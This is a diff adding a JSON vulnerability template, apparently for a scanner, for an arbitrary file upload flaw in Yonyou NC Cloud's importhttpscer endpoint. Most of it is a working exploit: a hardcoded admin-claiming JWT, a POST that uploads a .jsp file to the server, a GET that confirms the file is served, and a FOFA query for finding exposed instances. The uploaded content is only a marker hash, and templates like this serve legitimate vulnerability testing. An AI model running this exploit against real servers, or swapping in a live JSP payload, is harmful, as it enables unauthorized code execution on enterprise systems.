@@ -1,0 +1,62 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud importhttpscer接口任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC Cloud importhttpscer接口存在任意文件上传漏洞。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-NC-Cloud\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486015&idx=1&sn=6fd61fb957dabec717b5b034b468516d&chksm=974b8738a03c0e2efda29f5285dfc9f4f3631599f067d0a62fd8263d52d97d17303e63369b7d&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/nccloud/mob/pfxx/manualload/importhttpscer",
+        "header": {
+          "accessToken": "eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA"
+        },
+        "file": {
+          "file": [
+            "52e039302a62d077.jsp",
+            "95cc64dd2825f9df13ec4ad683ecf339",
+            "application/octet-stream"
+          ]
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "success"
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/52e039302a62d077.jsp"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
